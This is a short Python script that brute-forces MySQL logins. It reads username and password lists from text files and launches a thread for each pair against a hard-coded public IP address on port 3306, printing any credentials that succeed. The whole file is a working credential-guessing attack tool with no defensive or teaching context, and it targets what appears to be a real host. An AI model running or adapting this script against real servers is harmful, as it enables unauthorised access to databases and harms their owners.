import pymysql
from threading import *

maxConnections = 30
connection_lock = BoundedSemaphore(value=maxConnections)

plugin = 'mysql'
timeout = 2

ips = ['106.12.22.125']


def start():

    with open('usernames.txt', 'r') as f:
        usernames = f.readlines()

    with open('passwords.txt', 'r') as f:
        passwords = f.readlines()

    for ip in ips:
        for password in passwords:
            password = password.strip()
            for username in usernames:
                try:
                    t = Thread(target=mysql_brute, args=(ip, 3306, username, password))
                    t.start()
                except Exception as e:
                    pass


def mysql_brute(ip, port, user, passwd):
    try:
        pymysql.Connect(
            host=ip,
            port=port,
            user=user,
            passwd=passwd,
            connect_timeout=1
        )

        print('+ %s mysql login successful!' % ip)
        print('+ %s:%s' % (user, passwd))
    except Exception as e:
        pass


start()